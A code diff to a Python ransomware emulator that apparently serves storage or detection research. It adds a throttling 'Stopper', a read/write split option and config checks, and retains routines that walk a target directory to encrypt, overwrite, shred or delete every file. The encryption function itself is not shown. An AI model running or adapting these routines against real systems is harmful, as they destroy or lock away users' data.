@@ -20,6 +20,7 @@ access = 'R'
 Nrthreads = 1
 Nwthreads = 1
 Yfsync = 'N'
+rwsplit = 'N'
 
 class NoneWrapper:
     """
@@ -55,6 +56,7 @@ class Stopper:
     Each stop should last for timeout seconds.
     """
     def __init__(self, numblk, timeout):
+        self.numblk_std = numblk
         self.numblk = numblk
         self.timeout = timeout
         self.lock = threading.Lock()
@@ -69,6 +71,7 @@ class Stopper:
             if self.stop:
                 if time.time() - self.stop_time > self.timeout:
                     self.stop = False
+                    self.numblk = self.numblk_std
                     return False
                 else:
                     return True
@@ -77,86 +80,27 @@ class Stopper:
 
     def stop_now(self):
         """
-        Set the stop flag to True.
+        Force the ransomware (all operations) to stop until a timeout is reached.
         """
         with self.lock:
             self.stop = True
             self.stop_time = time.time()
 
-
-def read_rand(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
-    """
-    Read files from tar_sys_path and insert them into chunk_set which is a class consisting of a dictionary of chunks.
-    The ChunkSet is indexed by fpath and each fpath is mapped to a list of chunks.
-    This function blocks unlike threaded prefixed functions.
-    @rm determines whether we need to remove the file 
-    and create an empty one after reading it.
-    """
-    
-
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            # Get the file length first
-            flen = os.path.getsize(os.path.join(root, filename))
-            
-            filepath = os.path.join(root, filename)
-            with open(filepath, "rb") as f:
-                loff_set = [i for i in range(0, flen, chunk_size)]
-                # randomize the loff_set
-                import random
-                random.shuffle(loff_set)
-                for loff in loff_set:
-                    f.seek(loff)
-                    chunk = encrypt(f.read(chunk_size))
-                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
-            if shred:
-                with open(filepath, "r+b") as f:
-                    f.write(bytes([0] * flen))
-            if rm:
-                with open(filepath, "wb") as f:
-                    pass
-            if (shred or rm) and Yfsync == 'Y':
-                with open(filepath, "r+b") as f:
-                    f.flush()
-                    os.fsync(f.fileno())
-            
+    def try_stop(self, _numblk):
+        """
+        Try to stop the ransomware if the accumulated number of blocks reaches a certain amount.
+        If a stop is reached, stop now, and clear the numblk counter.
+        """
+        with self.lock:
+            if not self.check_stop() and _numblk <= self.numblk:
+                self.numblk -= _numblk
+            elif not self.check_stop() and _numblk > self.numblk:
+                self.numblk = 0
+                self.stop_now()
 
 
 
-    
-
-def read_whole_file(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
-    """
-    Basically the same as read_rand() but reads 
-    the whole file at once(then divide into chunks in memory) instead of in chunks.
-    This function blocks unlike threaded prefixed functions.
-    @rm determines whether we need to remove the file 
-    and create an empty one after reading it.
-    """
-
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            with open(filepath, "rb") as f:
-                file_contents = f.read()
-                loff = 0
-                while loff < len(file_contents):
-                    chunk = encrypt(file_contents[loff:loff+chunk_size])
-                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
-                    loff += len(chunk)
-            flen = os.path.getsize(filepath)
-            if shred:
-                with open(filepath, "r+b") as f:
-                    f.write(bytes([0] * flen))
-            if rm:
-                with open(filepath, "wb") as f:
-                    pass
-            if (shred or rm) and Yfsync == 'Y':
-                with open(filepath, "r+b") as f:
-                    f.flush()
-                    os.fsync(f.fileno())
-
-def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, 
+def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks, stopper,
                       chunk_size = 4096, num_threads = 1, rm = False, shred = False):
     """
     Read files from tar_sys_path and insert them into a queue.
@@ -184,6 +128,8 @@ def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks,
             with flocks[filepath]:
                 with open(filepath, "rb") as f:
                     file_contents = f.read()
+                    stopper.try_stop(len(file_contents))
+
                 flen = os.path.getsize(filepath)
                 if shred:
                     with open(filepath, "r+b") as f:
@@ -200,8 +146,7 @@ def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks,
             # Split the file contents into chunks and insert them into the ChunkSet
             loff = 0
             while loff < len(file_contents):
-                # chunk = [encrypt(file_contents[loff:loff+chunk_size])]
-                chunk = bytes([255 - int(MAGIC_3)]*chunk_size) # faster to test 
+                chunk = [encrypt(file_contents[loff:loff+chunk_size])]
                 queue.put(Chunk(filepath, loff, len(chunk), chunk))
                 loff += len(chunk)
             # Mark the filename as done
@@ -217,7 +162,7 @@ def read_seq_threaded(tar_sys_path, queue, fname_queue, flocks,
     return threads
 
 
-def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, 
+def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks, stopper,
                        chunk_size = 4096, num_threads = 1, rm = False, shred = False):
     """
     Read files from tar_sys_path and insert them into a queue.
@@ -252,6 +197,7 @@ def read_rand_threaded(tar_sys_path, queue, fname_queue, flocks,
                     for loff in loff_set:
                         f.seek(loff)
                         chunk = f.read(chunk_size)
+                        stopper.try_stop(len(chunk))
                         # chunk = encrypt(chunk)
                         if chunk:
                             chunk = bytes([255 - int(chunk[0])]*len(chunk)) # faster to test
@@ -321,38 +267,9 @@ def flush_chunk_buf(chunks, flocks = None):
 
 # write has side-effect of flushing & syncing if enabled
 
-def write_rand(queue, tar_sys_path):
-    """
-    Note : Important - This function must be followed by a BLOCKED read function. 
-    Meaning nothing will go to queue
-    Write the encrypted chunks in chunk_set back to tar_sys_path.
-    """
-    import random
-    CHUNK_CACHE_SIZE = 100
-    chunks = []
-    while not queue.empty():
-        chunks.append(queue.get())
-        if len(chunks) == CHUNK_CACHE_SIZE:
-            random.shuffle(chunks)
-            flush_chunk_buf(chunks)
-    random.shuffle(chunks)
-    flush_chunk_buf(chunks)
 
-
-def write_whole_files(queue, tar_sys_path):
-    """
-    Note : Important - This function must be followed by a BLOCKED read function. 
-    Meaning nothing will go to queue
-    For each file, we first assemble the chunks then write the whole file back to disk.
-    """
-    while not queue.empty():
-        chunk = queue.get()
-        with open(chunk.fpath, "r+b") as f:
-            f.seek(chunk.loff)
-            f.write(chunk.data)
-
-
-def write_seq_threaded(queue, tar_sys_path, flocks, num_threads = 1):
+def write_seq_threaded(queue, tar_sys_path, flocks, stopper,
+                       num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
     """
@@ -370,6 +287,7 @@ def write_seq_threaded(queue, tar_sys_path, flocks, num_threads = 1):
                     with open(chunk.fpath, "r+b") as f:
                         f.seek(chunk.loff)
                         f.write(chunk.data)
+                        stopper.try_stop(len(chunk.data))
 
                 # Mark the filename as done
                 queue.task_done()
@@ -386,7 +304,8 @@ def write_seq_threaded(queue, tar_sys_path, flocks, num_threads = 1):
 
     return threads
 
-def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
+def write_rand_threaded(queue, tar_sys_path, flocks, stopper,
+                        num_threads = 1):
     """
     Write the encrypted chunks in chunk_set back to tar_sys_path in parallel.
     """
@@ -405,6 +324,7 @@ def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
                 if len(chunks) == CHUNK_CACHE_SIZE:
                     random.shuffle(chunks)
                     flush_chunk_buf(chunks, flocks)
+                    stopper.try_stop(sum([len(chunk.data) for chunk in chunks]))
 
                 # Mark the filename as done
                 queue.task_done()
@@ -412,6 +332,7 @@ def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
                 if chunks:
                     random.shuffle(chunks)
                     flush_chunk_buf(chunks, flocks)
+                    stopper.try_stop(sum([len(chunk.data) for chunk in chunks]))
                 pass
             
 
@@ -427,29 +348,11 @@ def write_rand_threaded(queue, tar_sys_path, flocks, num_threads = 1):
   
 
 
-def delete_all(tar_sys_path):
-    """
-    Delete all the files in tar_sys_path.
-    """
-    for root, dirs, files in os.walk(tar_sys_path):
-        for filename in files:
-            filepath = os.path.join(root, filename)
-            os.remove(filepath)
-            
-def create_all(tar_sys_path, chunk_set):
-    """
-    Get keys from chunk set (a set of file names) then we create those files in tar_sys_path as empty files.
-    """
-    fnames = chunk_set.get_names()
-    for name in fnames:
-        filepath = name
-        with open(filepath, "wb") as f:
-            pass
-
 # below are a list of operation sequences
 
 def main_overwrite():
     tar_sys_path = PATHS['injected_path']
+    stopper = Stopper(int(blknum), int(timeout))
     # file locks(flocks) are to protect against seek race conditions
     # Notice in python open will also move the file pointer, so 
     # seek, open should be protected by the same lock.
@@ -471,6 +374,14 @@ def main_overwrite():
         print("------------------")
         exit(1)
 
+    if rwsplit == 'Y':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
+
     if access.split('/')[1].rstrip('\n') == 'R':
         wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
@@ -481,12 +392,13 @@ def main_overwrite():
         print("------------------")
         exit(1)
     
-    # wait for all the read threads to finish
-    fname_queue.join()
-    for i in range(len(rthreads)):
-        fname_queue.put(None)
-    for t in rthreads:
-        t.join()
+    if rwsplit == 'N':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
 
     # wait for all the write threads to finish
     queue.join()
@@ -503,6 +415,7 @@ def main_overwrite():
     
 def main_deletecreate():
     tar_sys_path = PATHS["injected_path"]
+    stopper = Stopper(int(blknum), int(timeout))
     queue = PriorityQueue()
 
     flocks = {os.path.join(root, filename) : threading.Lock() 
@@ -522,7 +435,13 @@ def main_deletecreate():
         print("Invalid access pattern")
         print("------------------")
         exit(1)
-
+    if rwsplit == 'Y':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
     if access.split('/')[1].rstrip('\n') == 'R':
         wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
@@ -532,13 +451,13 @@ def main_deletecreate():
         print("Invalid access pattern")
         print("------------------")
         exit(1)
-
-    # wait for all the read threads to finish
-    fname_queue.join()
-    for i in range(len(rthreads)):
-        fname_queue.put(None)
-    for t in rthreads:
-        t.join()
+    if rwsplit == 'N':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
 
     # wait for all the write threads to finish
     queue.join()
@@ -551,6 +470,7 @@ def main_deletecreate():
 
 def main_shredcreate():
     tar_sys_path = PATHS["injected_path"]
+    stopper = Stopper(int(blknum), int(timeout))
     queue = PriorityQueue()
 
     flocks = {os.path.join(root, filename) : threading.Lock() 
@@ -573,6 +493,14 @@ def main_shredcreate():
         print("------------------")
         exit(1)
 
+    if rwsplit == 'Y':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
+
     if access.split('/')[1].rstrip('\n') == 'R':
         wthreads = write_rand_threaded(queue, tar_sys_path, flocks, num_threads = Nwthreads)
     elif access.split('/')[1].rstrip('\n') == 'S':
@@ -582,13 +510,13 @@ def main_shredcreate():
         print("Invalid access pattern")
         print("------------------")
         exit(1)
-
-    # wait for all the read threads to finish
-    fname_queue.join()
-    for i in range(len(rthreads)):
-        fname_queue.put(None)
-    for t in rthreads:
-        t.join()
+    if rwsplit == 'N':
+        # wait for all the read threads to finish
+        fname_queue.join()
+        for i in range(len(rthreads)):
+            fname_queue.put(None)
+        for t in rthreads:
+            t.join()
 
     # wait for all the write threads to finish
     queue.join()
@@ -602,7 +530,7 @@ def main_shredcreate():
 # below are a list of helper functions
 
 def read_attr():
-    global mode, timeout, blknum, threads, access, Yfsync
+    global mode, timeout, blknum, threads, access, Yfsync, rwsplit
     global Nrthreads, Nwthreads
     test_dir_path_file = PATHS['test_dir_path_file']
     with open(test_dir_path_file, 'r') as f:
@@ -625,7 +553,26 @@ def read_attr():
                 access = line.split('=')[1].rstrip('\n')
             elif line.startswith('fsync='):
                 Yfsync = line.split('=')[1].rstrip('\n')
-    print(f"mode={mode} timeout={timeout} blknum={blknum} threads={threads} access={access}")
+            elif line.startswith('rwsplit='):
+                rwsplit = line.split('=')[1].rstrip('\n')
+    print(f"mode={mode} timeout={timeout} blknum={blknum}")
+    print(f"threads={threads} access={access} rwsplit={rwsplit}")
+    # sanity check
+    if mode != 'O' and mode != 'D' and mode != 'S':
+        print_red(f"Invalid mode {mode}")
+        exit(1)
+    if rwsplit != 'Y' and rwsplit != 'N':
+        print_red(f"Invalid rwsplit {rwsplit}")
+        exit(1)
+    if Yfsync != 'Y' and Yfsync != 'N':
+        print_red(f"Invalid fsync {Yfsync}")
+        exit(1)
+    if access != 'R/R' and access != 'R/S' and access != 'S/R' and access != 'S/S':
+        print_red(f"Invalid access {access}")
+        exit(1)
+    if Nrthreads < 1 or Nwthreads < 1:
+        print_red(f"Invalid threads {threads}")
+        exit(1)
     return
 
 if __name__ == '__main__':
@@ -673,3 +620,127 @@ def encrpt_all(chunk_set, tar_sys_path):
         for filename in files:
             filepath = os.path.join(root, filename)
             chunk_set.encrpt(filepath)
+
+
+def read_rand(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
+    """ legacy
+    Read files from tar_sys_path and insert them into chunk_set which is a class consisting of a dictionary of chunks.
+    The ChunkSet is indexed by fpath and each fpath is mapped to a list of chunks.
+    This function blocks unlike threaded prefixed functions.
+    @rm determines whether we need to remove the file 
+    and create an empty one after reading it.
+    """
+    
+
+    for root, dirs, files in os.walk(tar_sys_path):
+        for filename in files:
+            # Get the file length first
+            flen = os.path.getsize(os.path.join(root, filename))
+            
+            filepath = os.path.join(root, filename)
+            with open(filepath, "rb") as f:
+                loff_set = [i for i in range(0, flen, chunk_size)]
+                # randomize the loff_set
+                import random
+                random.shuffle(loff_set)
+                for loff in loff_set:
+                    f.seek(loff)
+                    chunk = encrypt(f.read(chunk_size))
+                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
+            if shred:
+                with open(filepath, "r+b") as f:
+                    f.write(bytes([0] * flen))
+            if rm:
+                with open(filepath, "wb") as f:
+                    pass
+            if (shred or rm) and Yfsync == 'Y':
+                with open(filepath, "r+b") as f:
+                    f.flush()
+                    os.fsync(f.fileno())
+            
+
+
+
+    
+
+def read_whole_file(tar_sys_path, queue, chunk_size = 4096, rm = False, shred = False):
+    """ legacy
+    Basically the same as read_rand() but reads 
+    the whole file at once(then divide into chunks in memory) instead of in chunks.
+    This function blocks unlike threaded prefixed functions.
+    @rm determines whether we need to remove the file 
+    and create an empty one after reading it.
+    """
+
+    for root, dirs, files in os.walk(tar_sys_path):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            with open(filepath, "rb") as f:
+                file_contents = f.read()
+                loff = 0
+                while loff < len(file_contents):
+                    chunk = encrypt(file_contents[loff:loff+chunk_size])
+                    queue.put(Chunk(filepath, loff, len(chunk), chunk))
+                    loff += len(chunk)
+            flen = os.path.getsize(filepath)
+            if shred:
+                with open(filepath, "r+b") as f:
+                    f.write(bytes([0] * flen))
+            if rm:
+                with open(filepath, "wb") as f:
+                    pass
+            if (shred or rm) and Yfsync == 'Y':
+                with open(filepath, "r+b") as f:
+                    f.flush()
+                    os.fsync(f.fileno())
+
+
+
+def write_rand(queue, tar_sys_path):
+    """ legacy
+    Note : Important - This function must be followed by a BLOCKED read function. 
+    Meaning nothing will go to queue
+    Write the encrypted chunks in chunk_set back to tar_sys_path.
+    """
+    import random
+    CHUNK_CACHE_SIZE = 100
+    chunks = []
+    while not queue.empty():
+        chunks.append(queue.get())
+        if len(chunks) == CHUNK_CACHE_SIZE:
+            random.shuffle(chunks)
+            flush_chunk_buf(chunks)
+    random.shuffle(chunks)
+    flush_chunk_buf(chunks)
+
+
+def write_whole_files(queue, tar_sys_path):
+    """ legacy
+    Note : Important - This function must be followed by a BLOCKED read function. 
+    Meaning nothing will go to queue
+    For each file, we first assemble the chunks then write the whole file back to disk.
+    """
+    while not queue.empty():
+        chunk = queue.get()
+        with open(chunk.fpath, "r+b") as f:
+            f.seek(chunk.loff)
+            f.write(chunk.data)
+
+def delete_all(tar_sys_path):
+    """ legacy
+    Delete all the files in tar_sys_path.
+    """
+    for root, dirs, files in os.walk(tar_sys_path):
+        for filename in files:
+            filepath = os.path.join(root, filename)
+            os.remove(filepath)
+            
+def create_all(tar_sys_path, chunk_set):
+    """ legacy
+    Get keys from chunk set (a set of file names) then we create those files in tar_sys_path as empty files.
+    """
+    fnames = chunk_set.get_names()
+    for name in fnames:
+        filepath = name
+        with open(filepath, "wb") as f:
+            pass
